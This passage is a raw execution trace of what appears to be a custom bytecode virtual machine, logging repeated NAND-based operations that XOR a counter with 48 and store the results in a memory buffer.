c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -4
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (19)
v14 = v1[320] (#)
c = v14
v13 = v1[150] (35)
c += v13
v10 = c(276)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[276] = v12 (19)
v10 = v1[320] (35)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (36)
v15 = &amp;v1[325] (28)
--*v15
v14 = v1[320] ($)
c = v14
v10 = c(36)
dword_6010A4 = v10
v13 = v1[92] (36)
c += v13
v6 = c
v14 = v1[277] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 36 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] ($)
c = v14
dword_6010A4 = -33 ; c = 36
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-5)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -5
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (20)
v14 = v1[320] ($)
c = v14
v13 = v1[150] (36)
c += v13
v10 = c(277)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[277] = v12 (20)
v10 = v1[320] (36)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (37)
v15 = &amp;v1[325] (27)
--*v15
v14 = v1[320] (%)
c = v14
v10 = c(37)
dword_6010A4 = v10
v13 = v1[92] (37)
c += v13
v6 = c
v14 = v1[278] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 37 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (%)
c = v14
dword_6010A4 = -33 ; c = 37
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-6)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -6
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (21)
v14 = v1[320] (%)
c = v14
v13 = v1[150] (37)
c += v13
v10 = c(278)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[278] = v12 (21)
v10 = v1[320] (37)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (38)
v15 = &amp;v1[325] (26)
--*v15
v14 = v1[320] (&amp;)
c = v14
v10 = c(38)
dword_6010A4 = v10
v13 = v1[92] (38)
c += v13
v6 = c
v14 = v1[279] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 38 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (&amp;)
c = v14
dword_6010A4 = -33 ; c = 38
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-7)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -7
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (22)
v14 = v1[320] (&amp;)
c = v14
v13 = v1[150] (38)
c += v13
v10 = c(279)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[279] = v12 (22)
v10 = v1[320] (38)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (39)
v15 = &amp;v1[325] (25)
--*v15
v14 = v1[320] (&#39;)
c = v14
v10 = c(39)
dword_6010A4 = v10
v13 = v1[92] (39)
c += v13
v6 = c
v14 = v1[280] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 39 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (&#39;)
c = v14
dword_6010A4 = -33 ; c = 39
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-8)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -8
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (23)
v14 = v1[320] (&#39;)
c = v14
v13 = v1[150] (39)
c += v13
v10 = c(280)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[280] = v12 (23)
v10 = v1[320] (39)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (40)
v15 = &amp;v1[325] (24)
--*v15
v14 = v1[320] (()
c = v14
v10 = c(40)
dword_6010A4 = v10
v13 = v1[92] (40)
c += v13
v6 = c
v14 = v1[281] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 40 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (()
c = v14
dword_6010A4 = -33 ; c = 40
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-9)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -9
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (24)
v14 = v1[320] (()
c = v14
v13 = v1[150] (40)
c += v13
v10 = c(281)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[281] = v12 (24)
v10 = v1[320] (40)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (41)
v15 = &amp;v1[325] (23)
--*v15
v14 = v1[320] ())
c = v14
v10 = c(41)
dword_6010A4 = v10
v13 = v1[92] (41)
c += v13
v6 = c
v14 = v1[282] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 41 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] ())
c = v14
dword_6010A4 = -33 ; c = 41
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-10)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -10
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (25)
v14 = v1[320] ())
c = v14
v13 = v1[150] (41)
c += v13
v10 = c(282)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[282] = v12 (25)
v10 = v1[320] (41)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (42)
v15 = &amp;v1[325] (22)
--*v15
v14 = v1[320] (*)
c = v14
v10 = c(42)
dword_6010A4 = v10
v13 = v1[92] (42)
c += v13
v6 = c
v14 = v1[283] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 42 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (*)
c = v14
dword_6010A4 = -33 ; c = 42
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-11)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -11
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (26)
v14 = v1[320] (*)
c = v14
v13 = v1[150] (42)
c += v13
v10 = c(283)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[283] = v12 (26)
v10 = v1[320] (42)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (43)
v15 = &amp;v1[325] (21)
--*v15
v14 = v1[320] (+)
c = v14
v10 = c(43)
dword_6010A4 = v10
v13 = v1[92] (43)
c += v13
v6 = c
v14 = v1[284] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 43 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (+)
c = v14
dword_6010A4 = -33 ; c = 43
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-12)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -12
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (27)
v14 = v1[320] (+)
c = v14
v13 = v1[150] (43)
c += v13
v10 = c(284)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[284] = v12 (27)
v10 = v1[320] (43)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (44)
v15 = &amp;v1[325] (20)
--*v15
v14 = v1[320] (,)
c = v14
v10 = c(44)
dword_6010A4 = v10
v13 = v1[92] (44)
c += v13
v6 = c
v14 = v1[285] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 44 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (,)
c = v14
dword_6010A4 = -33 ; c = 44
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-13)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -13
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (28)
v14 = v1[320] (,)
c = v14
v13 = v1[150] (44)
c += v13
v10 = c(285)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[285] = v12 (28)
v10 = v1[320] (44)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (45)
v15 = &amp;v1[325] (19)
--*v15
v14 = v1[320] (-)
c = v14
v10 = c(45)
dword_6010A4 = v10
v13 = v1[92] (45)
c += v13
v6 = c
v14 = v1[286] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 45 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (-)
c = v14
dword_6010A4 = -33 ; c = 45
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-14)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -14
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (29)
v14 = v1[320] (-)
c = v14
v13 = v1[150] (45)
c += v13
v10 = c(286)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[286] = v12 (29)
v10 = v1[320] (45)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (46)
v15 = &amp;v1[325] (18)
--*v15
v14 = v1[320] (.)
c = v14
v10 = c(46)
dword_6010A4 = v10
v13 = v1[92] (46)
c += v13
v6 = c
v14 = v1[287] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 46 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (.)
c = v14
dword_6010A4 = -33 ; c = 46
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-15)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -15
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (30)
v14 = v1[320] (.)
c = v14
v13 = v1[150] (46)
c += v13
v10 = c(287)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[287] = v12 (30)
v10 = v1[320] (46)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (47)
v15 = &amp;v1[325] (17)
--*v15
v14 = v1[320] (/)
c = v14
v10 = c(47)
dword_6010A4 = v10
v13 = v1[92] (47)
c += v13
v6 = c
v14 = v1[288] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 47 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-33)
v10 = c(-33)
dword_6010A4 = v10
v14 = v1[320] (/)
c = v14
dword_6010A4 = -33 ; c = 47
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-16)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -33 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-17)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -17 ; c = -16
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (31)
v14 = v1[320] (/)
c = v14
v13 = v1[150] (47)
c += v13
v10 = c(288)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[288] = v12 (31)
v10 = v1[320] (47)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (48)
v15 = &amp;v1[325] (16)
--*v15
v14 = v1[320] (0)
c = v14
v10 = c(48)
dword_6010A4 = v10
v13 = v1[92] (48)
c += v13
v6 = c
v14 = v1[289] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 48 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-1)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -1
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (0)
v14 = v1[320] (0)
c = v14
v13 = v1[150] (48)
c += v13
v10 = c(289)
dword_6010A4 = v10
v14 = v1[324] ( )
c = v14
v8 = dword_6010A4
v12 = c
v1[289] = v12 (0)
v10 = v1[320] (48)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (49)
v15 = &amp;v1[325] (15)
--*v15
v14 = v1[320] (1)
c = v14
v10 = c(49)
dword_6010A4 = v10
v13 = v1[92] (49)
c += v13
v6 = c
v14 = v1[290] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (1)
c = v14
dword_6010A4 = -49 ; c = 49
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-2)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -2
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (1)
v14 = v1[320] (1)
c = v14
v13 = v1[150] (49)
c += v13
v10 = c(290)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[290] = v12 (1)
v10 = v1[320] (49)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (50)
v15 = &amp;v1[325] (14)
--*v15
v14 = v1[320] (2)
c = v14
v10 = c(50)
dword_6010A4 = v10
v13 = v1[92] (50)
c += v13
v6 = c
v14 = v1[291] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 50 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (2)
c = v14
dword_6010A4 = -49 ; c = 50
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-3)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -3
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (2)
v14 = v1[320] (2)
c = v14
v13 = v1[150] (50)
c += v13
v10 = c(291)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[291] = v12 (2)
v10 = v1[320] (50)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (51)
v15 = &amp;v1[325] (13)
--*v15
v14 = v1[320] (3)
c = v14
v10 = c(51)
dword_6010A4 = v10
v13 = v1[92] (51)
c += v13
v6 = c
v14 = v1[292] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 51 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (3)
c = v14
dword_6010A4 = -49 ; c = 51
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-4)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -4
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (3)
v14 = v1[320] (3)
c = v14
v13 = v1[150] (51)
c += v13
v10 = c(292)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[292] = v12 (3)
v10 = v1[320] (51)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (52)
v15 = &amp;v1[325] (12)
--*v15
v14 = v1[320] (4)
c = v14
v10 = c(52)
dword_6010A4 = v10
v13 = v1[92] (52)
c += v13
v6 = c
v14 = v1[293] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 52 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (4)
c = v14
dword_6010A4 = -49 ; c = 52
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-5)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -5
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (4)
v14 = v1[320] (4)
c = v14
v13 = v1[150] (52)
c += v13
v10 = c(293)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[293] = v12 (4)
v10 = v1[320] (52)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (53)
v15 = &amp;v1[325] (11)
--*v15
v14 = v1[320] (5)
c = v14
v10 = c(53)
dword_6010A4 = v10
v13 = v1[92] (53)
c += v13
v6 = c
v14 = v1[294] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 53 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (5)
c = v14
dword_6010A4 = -49 ; c = 53
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-6)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -6
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (5)
v14 = v1[320] (5)
c = v14
v13 = v1[150] (53)
c += v13
v10 = c(294)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[294] = v12 (5)
v10 = v1[320] (53)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (54)
v15 = &amp;v1[325] (10)
--*v15
v14 = v1[320] (6)
c = v14
v10 = c(54)
dword_6010A4 = v10
v13 = v1[92] (54)
c += v13
v6 = c
v14 = v1[295] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 54 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (6)
c = v14
dword_6010A4 = -49 ; c = 54
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-7)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -7
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (6)
v14 = v1[320] (6)
c = v14
v13 = v1[150] (54)
c += v13
v10 = c(295)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[295] = v12 (6)
v10 = v1[320] (54)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (55)
v15 = &amp;v1[325] (9)
--*v15
v14 = v1[320] (7)
c = v14
v10 = c(55)
dword_6010A4 = v10
v13 = v1[92] (55)
c += v13
v6 = c
v14 = v1[296] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 55 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (7)
c = v14
dword_6010A4 = -49 ; c = 55
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-8)
v14 = v1[321] (�)
c = v14
v14 = v1[323] (0)
c = v14
dword_6010A4 = -49 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v10 = c(-1)
dword_6010A4 = v10
v14 = v1[322] (�)
c = v14
dword_6010A4 = -1 ; c = -8
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[139] (324)
v12 = c
v1[324] = v12 (7)
v14 = v1[320] (7)
c = v14
v13 = v1[150] (55)
c += v13
v10 = c(296)
dword_6010A4 = v10
v14 = v1[324] ()
c = v14
v8 = dword_6010A4
v12 = c
v1[296] = v12 (7)
v10 = v1[320] (55)
dword_6010A4 = v10
dword_6010A4++
v12 = dword_6010A4
v8 = v1[168] (320)
v1[320] = v12 (56)
v15 = &amp;v1[325] (8)
--*v15
v14 = v1[320] (8)
c = v14
v10 = c(56)
dword_6010A4 = v10
v13 = v1[92] (56)
c += v13
v6 = c
v14 = v1[297] (0)
c = v14
v7 = v2
v8 = v1[98] (323)
v12 = c
v1[323] = v12 (48)
dword_6010A4 = 56 ; c = 48
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[104] (321)
v12 = c
v1[321] = v12 (-49)
v10 = c(-49)
dword_6010A4 = v10
v14 = v1[320] (8)
c = v14
dword_6010A4 = -49 ; c = 56
v14 = dword_6010A4 nand c
c = v14
v7 = v2
v8 = v1[116] (322)
v12 = c
v1[322] = v12 (-9)
